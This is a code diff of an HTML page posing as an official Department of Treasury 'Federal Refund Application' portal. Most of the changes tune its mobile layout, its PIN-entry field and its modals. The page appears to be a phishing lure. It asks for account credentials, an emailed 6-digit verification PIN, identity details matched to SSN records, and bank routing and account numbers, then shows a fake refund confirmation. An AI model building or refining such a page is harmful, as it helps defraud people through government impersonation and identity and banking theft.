@@ -1,8 +1,9 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <meta name="description" content="Official Federal Tax Refund Application Portal">
     <title>Federal Refund Disbursement Portal | Department of Treasury</title>
     <link rel="stylesheet" href="styles.css">
@@ -31,7 +32,7 @@
         .top-email-bar {
             background-color: #002868;
             color: white;
-            padding: 10px 15px;
+            padding: 0 15px;
             display: flex;
             justify-content: space-between;
             align-items: center;
@@ -43,6 +44,7 @@
             z-index: 2000;
             box-shadow: 0 2px 5px rgba(0,0,0,0.2);
             height: 50px;
+            box-sizing: border-box;
         }
 
         #user-session-display {
@@ -52,7 +54,7 @@
             border-radius: 4px;
             align-items: center;
             overflow: hidden;
-            max-width: 60%;
+            max-width: 65%;
         }
         
         #session-email-text {
@@ -60,7 +62,7 @@
             overflow: hidden;
             text-overflow: ellipsis;
             display: inline-block;
-            max-width: 100px;
+            max-width: 120px;
         }
 
         .status-dot {
@@ -76,44 +78,47 @@
         /* EXACTLY 6 PIN lines styling - Precision CSS for perfect mobile alignment */
         .pin-input-container {
             position: relative;
-            margin: 20px auto;
+            margin: 25px auto;
             display: flex;
             justify-content: center;
             width: 100%;
+            overflow: hidden;
         }
         .styled-pin-input {
             font-family: 'Courier New', Courier, monospace;
             font-size: 2.2rem;
             /* Perfectly matches 6 lines of 30px with 10px gaps */
-            letter-spacing: 21.5px; 
+            letter-spacing: 21px; 
             text-align: left;
             padding-left: 12px;
             border: none;
-            /* 30px line + 10px gap = 40px cycle. (6 * 40) - 10 = 230px total */
-            background: repeating-linear-gradient(90deg, 
-                #002868 0, #002868 30px, 
-                transparent 30px, transparent 40px) 0 100% / 230px 3px no-repeat;
+            /* Using hard-stop linear gradient to ensure EXACTLY 6 lines */
+            background-image: linear-gradient(to right, #002868 30px, transparent 30px);
+            background-size: 40px 3px;
+            background-repeat: repeat-x;
+            background-position: bottom left;
             color: #002868;
-            width: 230px; 
+            width: 230px; /* (6 * 30px lines) + (5 * 10px gaps) = 230px */
             height: 55px;
             margin: 0 auto;
             display: block;
             outline: none;
-            background-position: bottom left;
             box-sizing: border-box;
+            border-radius: 0; /* Clean look */
         }
 
         /* Mobile-First Responsiveness Overrides */
         body { 
-            padding-top: 60px; 
+            padding-top: 65px; 
             margin: 0; 
             background: #f4f7f9; 
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            overflow-x: hidden;
         }
         
         .form-container {
             width: 94%;
-            max-width: 800px;
+            max-width: 600px;
             margin: 10px auto;
             padding: 20px 15px;
             background: #fff;
@@ -124,10 +129,12 @@
 
         .modal-content {
             width: 92% !important;
-            max-width: 400px;
-            padding: 25px 15px !important;
+            max-width: 380px;
+            padding: 25px 20px !important;
             border-radius: 15px !important;
             box-sizing: border-box;
+            max-height: 90vh;
+            overflow-y: auto;
         }
 
         .btn-group {
@@ -139,17 +146,21 @@
         
         .btn {
             width: 100%;
-            padding: 14px;
+            padding: 16px;
             font-size: 1rem;
             border-radius: 8px;
             font-weight: 600;
+            border: none;
+            cursor: pointer;
+            transition: background 0.2s;
         }
 
         @media (min-width: 600px) {
             .btn-group { flex-direction: row; justify-content: space-between; }
-            .btn-group .btn { width: auto; min-width: 120px; }
-            .top-email-bar { font-size: 0.85rem; padding: 10px 20px; }
+            .btn-group .btn { width: auto; min-width: 140px; }
+            .top-email-bar { font-size: 0.85rem; padding: 0 25px; }
             #session-email-text { max-width: none; }
+            .form-container { padding: 30px; }
         }
 
         .form-group label {
@@ -157,7 +168,7 @@
             margin-bottom: 8px;
             font-weight: 600;
             color: #333;
-            font-size: 0.95rem;
+            font-size: 0.9rem;
         }
 
         input[type="text"], 
@@ -168,22 +179,24 @@
         select {
             width: 100%;
             padding: 14px;
-            margin-bottom: 15px;
+            margin-bottom: 18px;
             box-sizing: border-box;
             border: 1px solid #ccc;
             border-radius: 8px;
-            font-size: 1rem;
+            font-size: 1rem; /* Prevents auto-zoom on iOS */
             appearance: none;
             background-color: #fff;
+            color: #333;
         }
 
         .radio-group {
             display: flex;
             flex-direction: column;
-            gap: 10px;
+            gap: 12px;
             background: #f8f9fa;
             padding: 15px;
             border-radius: 8px;
+            border: 1px solid #e9ecef;
         }
         
         .radio-group label {
@@ -191,7 +204,9 @@
             font-weight: normal;
             display: flex;
             align-items: center;
-            gap: 10px;
+            gap: 12px;
+            cursor: pointer;
+            font-size: 0.95rem;
         }
 
         @keyframes fadeIn { from { opacity: 0; transform: translateY(-5px); } to { opacity: 1; transform: translateY(0); } }
@@ -200,15 +215,16 @@
             font-size: 0.8rem;
             color: #666;
             background: #fff8e1;
-            padding: 10px;
+            padding: 12px;
             border-radius: 6px;
             border-left: 4px solid #ffc107;
-            margin-bottom: 15px;
+            margin-bottom: 18px;
+            line-height: 1.4;
         }
 
         /* Mobile specific fix for numbers falling out of boxes */
         #final-results-page h1 {
-            font-size: clamp(1.8rem, 8vw, 3.5rem);
+            font-size: clamp(2rem, 10vw, 3.5rem);
             word-wrap: break-word;
             word-break: break-all;
             margin: 10px 0;
@@ -217,7 +233,7 @@
 
         #final-results-page .result-box {
             background:#eef9f0; 
-            padding:20px 10px; 
+            padding:25px 15px; 
             border-radius:15px; 
             margin:20px 0; 
             border:2px dashed #28a745;
@@ -236,29 +252,52 @@
             color: #495057;
             line-height: 1.6;
         }
+
+        .btn-primary { background-color: #002868; color: white; }
+        .btn-secondary { background-color: #e9ecef; color: #495057; }
+        .btn-success { background-color: #28a745; color: white; }
+
+        /* Modal specific scroll fix */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            backdrop-filter: blur(3px);
+            z-index: 9999;
+            align-items: center;
+            justify-content: center;
+            padding: 10px;
+            box-sizing: border-box;
+        }
     </style>
 </head>
 <body>
 
 <div class="top-email-bar">
-    <div style="font-weight: bold; letter-spacing: 0.5px;">🏛️ TREASURY PORTAL</div>
+    <div style="font-weight: bold; letter-spacing: 0.5px; display: flex; align-items: center; gap: 5px;">
+        <span>🏛️</span> <span style="display: inline-block;">TREASURY PORTAL</span>
+    </div>
     <div id="user-session-display">
         <span class="status-dot"></span>
         <span id="session-email-text"></span>
-        <button id="btn-logout-top" onclick="window.Auth.logout()" style="background:#fff; color:#d9534f; border:1px solid #d9534f; padding:3px 8px; font-size:10px; cursor:pointer; border-radius:4px; font-weight:bold; margin-left:10px;">SIGN OUT</button>
+        <button id="btn-logout-top" onclick="window.Auth.logout()" style="background:#fff; color:#d9534f; border:1px solid #d9534f; padding:4px 8px; font-size:10px; cursor:pointer; border-radius:4px; font-weight:bold; margin-left:10px;">SIGN OUT</button>
     </div>
 </div>
 
 <div class="form-container" role="main">
     <div id="auth-controls" style="text-align:center; margin-bottom:25px; padding:20px; background:#f1f3f5; border-radius:12px; border: 1px solid #dee2e6;">
-        <p style="font-size:0.7rem; margin-bottom:12px; color:#6c757d; font-weight: 800; text-transform: uppercase; letter-spacing: 1px;">Secure Government Access</p>
-        <div id="auth-buttons-initial" style="display: flex; gap: 10px; justify-content: center;">
-            <button id="btn-show-login" class="btn btn-secondary" style="flex: 1;">Sign In</button>
-            <button id="btn-show-register" class="btn btn-primary" style="flex: 1;">Create ID</button>
+        <p style="font-size:0.7rem; margin-bottom:12px; color:#6c757d; font-weight: 800; text-transform: uppercase; letter-spacing: 1.5px;">Secure Government Access</p>
+        <div id="auth-buttons-initial" style="display: flex; gap: 12px; justify-content: center;">
+            <button id="btn-show-login" class="btn btn-secondary" style="flex: 1; padding: 12px;">Sign In</button>
+            <button id="btn-show-register" class="btn btn-primary" style="flex: 1; padding: 12px;">Create ID</button>
         </div>
     </div>
 
-    <div id="auth-modal" class="modal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:9999; align-items:center; justify-content:center;">
+    <div id="auth-modal" class="modal">
         <div class="modal-content" style="background:white; border-radius:15px; box-shadow: 0 10px 40px rgba(0,0,0,0.4);">
             <h3 id="auth-title" style="color:#002868; margin-top:0; border-bottom: 2px solid #f1f3f5; padding-bottom: 15px; margin-bottom: 20px;">Identity Verification</h3>
             
@@ -279,7 +318,7 @@
                     <input id="reg-dob" type="text" placeholder="MM/DD/YYYY" maxlength="10" required />
                     
                     <div style="margin-top:10px;">
-                        <button id="btn-register" class="btn btn-primary" type="button" style="margin-bottom: 10px;">Register Account</button>
+                        <button id="btn-register" class="btn btn-primary" type="button" style="margin-bottom: 12px;">Register Account</button>
                         <button id="btn-cancel-auth" class="btn btn-secondary" type="button">Cancel</button>
                     </div>
                 </form>
@@ -293,12 +332,12 @@
                     <label>Password</label>
                     <input id="login-password" type="password" placeholder="Min 8 characters" required />
                     
-                    <div style="text-align:right; margin: -5px 0 15px 0;">
-                        <a href="#" id="forgot-link" style="font-size:0.85rem; color:#0056b3; font-weight: 500;">Forgot Secure Password?</a>
+                    <div style="text-align:right; margin: -5px 0 20px 0;">
+                        <a href="#" id="forgot-link" style="font-size:0.85rem; color:#0056b3; font-weight: 500; text-decoration: none;">Forgot Secure Password?</a>
                     </div>
                     
                     <div>
-                        <button id="btn-login" class="btn btn-primary" type="button" style="margin-bottom: 10px;">Sign In</button>
+                        <button id="btn-login" class="btn btn-primary" type="button" style="margin-bottom: 12px;">Sign In</button>
                         <button id="btn-cancel-login" class="btn btn-secondary" type="button">Cancel</button>
                     </div>
                 </form>
@@ -306,10 +345,10 @@
                 <!-- Forgot -->
                 <form id="forgot-form" style="display:none;">
                     <div id="forgot-error" class="ui-error-message"></div>
-                    <p style="font-size:0.9rem; color: #555; line-height: 1.4; margin-bottom: 20px;">Enter your registered email. A 6-digit recovery code will be dispatched to your inbox.</p>
+                    <p style="font-size:0.9rem; color: #555; line-height: 1.5; margin-bottom: 20px;">Enter your registered email. A 6-digit recovery code will be dispatched to your inbox.</p>
                     <input id="forgot-email" type="email" placeholder="name@example.com" required />
                     <div style="margin-top:10px;">
-                        <button id="btn-forgot-send" class="btn btn-primary" type="button" style="margin-bottom: 10px;">Send Recovery Code</button>
+                        <button id="btn-forgot-send" class="btn btn-primary" type="button" style="margin-bottom: 12px;">Send Recovery Code</button>
                         <button id="btn-forgot-cancel" class="btn btn-secondary" type="button">Cancel</button>
                     </div>
                 </form>
@@ -324,7 +363,7 @@
                     <label>New Secure Password (8+ Chars)</label>
                     <input id="reset-password" type="password" minlength="8" placeholder="Enter new password" required />
                     <div style="margin-top:10px;">
-                        <button id="btn-reset-submit" class="btn btn-primary" type="button" style="margin-bottom: 10px;">Update Credentials</button>
+                        <button id="btn-reset-submit" class="btn btn-primary" type="button" style="margin-bottom: 12px;">Update Credentials</button>
                         <button id="btn-reset-cancel" class="btn btn-secondary" type="button">Cancel</button>
                     </div>
                 </form>
@@ -332,21 +371,21 @@
                 <!-- MFA -->
                 <form id="mfa-form" style="display:none; text-align:center;">
                     <div id="mfa-error-msg" class="ui-error-message"></div>
-                    <p style="font-size:0.9rem; background:#e3f2fd; padding:15px; border-radius:8px; color: #0d47a1; margin-bottom: 20px;">Identity challenge: Enter the 6-digit PIN sent to your email to authorize this session.</p>
+                    <p style="font-size:0.9rem; background:#e3f2fd; padding:18px; border-radius:8px; color: #0d47a1; margin-bottom: 25px; line-height: 1.5;"><strong>Identity Challenge:</strong> Enter the 6-digit PIN sent to your email to authorize this session.</p>
                     <div class="pin-input-container">
                         <input id="mfa-code" type="text" class="styled-pin-input" maxlength="6" inputmode="numeric" placeholder="------" />
                     </div>
-                    <button id="btn-verify-mfa" class="btn btn-primary" type="button" style="width:100%; height:55px; margin-top:15px; font-size: 1.1rem;">Validate Session PIN</button>
+                    <button id="btn-verify-mfa" class="btn btn-primary" type="button" style="width:100%; height:60px; margin-top:20px; font-size: 1.1rem; border-radius: 10px;">Validate Session PIN</button>
                 </form>
             </div>
         </div>
     </div>
 
-    <h2 id="portal-title" style="font-size:1.4rem; color:#002868; text-align:center; margin-bottom: 10px;">Federal Refund Application</h2>
+    <h2 id="portal-title" style="font-size:1.4rem; color:#002868; text-align:center; margin-bottom: 10px; line-height: 1.2;">Federal Refund Application</h2>
 
     <div class="step-indicator" id="progress-bar" style="margin-bottom:25px;">
         <div style="font-size:0.8rem; text-align:center; color:#666; font-weight: 600;">Processing: Step <span id="current-step-num">1</span> of 5</div>
-        <div style="width: 100%; background: #eee; height: 6px; border-radius: 3px; margin-top: 8px; overflow: hidden;">
+        <div style="width: 100%; background: #eee; height: 8px; border-radius: 4px; margin-top: 10px; overflow: hidden;">
             <div id="progress-fill" style="width: 20%; background: #002868; height: 100%; transition: width 0.3s ease;"></div>
         </div>
     </div>
@@ -356,16 +395,16 @@
         
         <!-- STEP 1: Filing -->
         <div class="step-content active" data-step="1">
-            <div class="form-group official-seal-bg" style="padding:15px; border-radius:8px; border-left-width: 6px;">
+            <div class="form-group official-seal-bg" style="padding:18px; border-radius:8px; border-left-width: 6px;">
                 <label>Tax Filing Period *</label>
                 <select id="tax-year" required>
                     <option value="">Select Reporting Year...</option>
-                    <option value="2024">Tax Year 2026 (Current)</option>
-                    <option value="2023">Tax Year 2024</option>
-                    <option value="2022">Tax Year 2023</option>
+                    <option value="2026">Tax Year 2026 (Current)</option>
+                    <option value="2024">Tax Year 2024</option>
+                    <option value="2023">Tax Year 2023</option>
                 </select>
             </div>
-            <div class="form-group" style="margin-top:20px;">
+            <div class="form-group" style="margin-top:25px;">
                 <label>Filing Category *</label>
                 <div class="radio-group">
                     <label><input type="radio" name="filing-status" value="single" required> <span>Single Individual</span></label>
@@ -377,7 +416,7 @@
 
         <!-- STEP 2: Identity -->
         <div class="step-content" data-step="2" style="display:none;">
-            <p class="security-note">Sensitive identity fields. Ensure details match your official SSN records precisely.</p>
+            <p class="security-note">Sensitive identity fields. Ensure details match your official SSN records precisely to avoid audit delays.</p>
             <label>Legal Full Name *</label>
             <input type="text" id="full-name" placeholder="First Middle Last" required />
             
@@ -409,7 +448,7 @@
 
         <!-- STEP 4: Banking -->
         <div class="step-content" data-step="4" style="display:none;">
-            <h3 style="font-size: 1.1rem; color: #002868; margin-top: 0;">EFT Disbursement Details</h3>
+            <h3 style="font-size: 1.1rem; color: #002868; margin-top: 0; margin-bottom: 15px;">EFT Disbursement Details</h3>
             <label>Financial Institution Name *</label>
             <input type="text" id="bank-name" placeholder="e.g. Chase, BofA" required />
             <label>9-Digit Routing Number *</label>
@@ -420,14 +459,14 @@
 
         <!-- STEP 5: Audit -->
         <div class="step-content" data-step="5" style="display:none;">
-            <h3 style="font-size: 1.1rem; color: #002868; margin-top: 0;">Review & Declaration</h3>
-            <div id="review-summary" style="padding:15px; background:#f0f4f8; border:1px solid #d1d9e6; border-radius:10px; font-size:0.95rem; line-height: 1.6;">
+            <h3 style="font-size: 1.1rem; color: #002868; margin-top: 0; margin-bottom: 15px;">Review & Declaration</h3>
+            <div id="review-summary" style="padding:18px; background:#f0f4f8; border:1px solid #d1d9e6; border-radius:10px; font-size:0.95rem; line-height: 1.7;">
                 <!-- Dynamically Populated -->
             </div>
-            <div style="margin-top:20px; background: #fffbe6; padding: 12px; border: 1px solid #ffe58f; border-radius: 8px;">
-                <label style="display:flex; align-items: flex-start; gap: 10px; cursor: pointer; margin: 0;">
-                    <input type="checkbox" id="consent" style="margin-top: 4px;" required /> 
-                    <span style="font-size: 0.85rem; color: #856404;">I declare under penalty of perjury that the information provided is accurate and complete to my knowledge.</span>
+            <div style="margin-top:25px; background: #fffbe6; padding: 15px; border: 1px solid #ffe58f; border-radius: 8px;">
+                <label style="display:flex; align-items: flex-start; gap: 12px; cursor: pointer; margin: 0;">
+                    <input type="checkbox" id="consent" style="margin-top: 5px; width: 18px; height: 18px;" required /> 
+                    <span style="font-size: 0.85rem; color: #856404; line-height: 1.4;">I declare under penalty of perjury that the information provided in this electronic filing is accurate and complete to the best of my knowledge.</span>
                 </label>
             </div>
         </div>
@@ -435,28 +474,29 @@
         <div class="btn-group">
             <button type="button" class="btn btn-secondary" id="prevBtn" disabled>Return</button>
             <button type="button" class="btn btn-primary" id="nextBtn">Continue Application</button>
-            <button type="submit" class="btn btn-success" id="submitBtn" style="display:none; background-color: #28a745; color: white; border: none;">Submit Official Application</button>
+            <button type="submit" class="btn btn-success" id="submitBtn" style="display:none;">Submit Official Application</button>
         </div>
     </form>
 
-    <div id="final-results-page" style="display:none; text-align:center; padding:40px 10px;">
-        <div style="font-size:70px; color:#28a745; margin-bottom: 20px;">✓</div>
-        <h2 style="color:#002868; margin-top: 0;">Application Filed</h2>
+    <div id="final-results-page" style="display:none; text-align:center; padding:30px 10px;">
+        <div style="font-size:80px; color:#28a745; margin-bottom: 20px; line-height: 1;">✓</div>
+        <h2 style="color:#002868; margin-top: 0; margin-bottom: 10px;">Application Filed</h2>
         <div class="result-box">
-            <p style="margin:0; font-weight:600; color:#555;">Estimated Refund Amount:</p>
+            <p style="margin:0; font-weight:600; color:#555; font-size: 0.9rem; text-transform: uppercase; letter-spacing: 0.5px;">Estimated Refund Amount:</p>
             <h1>$<span id="display-refund-amount">0.00</span></h1>
         </div>
-        <p><strong>Application Ref:</strong> <span id="display-app-id"></span></p>
+        <p style="font-size: 0.95rem;"><strong>Application Ref:</strong> <span id="display-app-id" style="color: #002868; font-family: monospace; font-size: 1.1rem;"></span></p>
         
         <div class="professional-message">
             <p><strong>Next Steps:</strong></p>
             <p>Thank you for your application. Our treasury disbursement team is currently reviewing your information for accuracy. You will receive an official confirmation and further instructions via your registered email address soon. We appreciate your patience as we process your request with the highest security standards.</p>
         </div>
         
-        <button onclick="window.location.reload()" class="btn btn-primary" style="margin-top:20px;">Return to Homepage</button>
+        <button onclick="window.location.reload()" class="btn btn-primary" style="margin-top:25px; padding: 18px;">Return to Homepage</button>
     </div>
 </div>
 
+<!-- Scripts -->
 <script src="auth.js"></script>
 <script src="tax.js"></script>
 
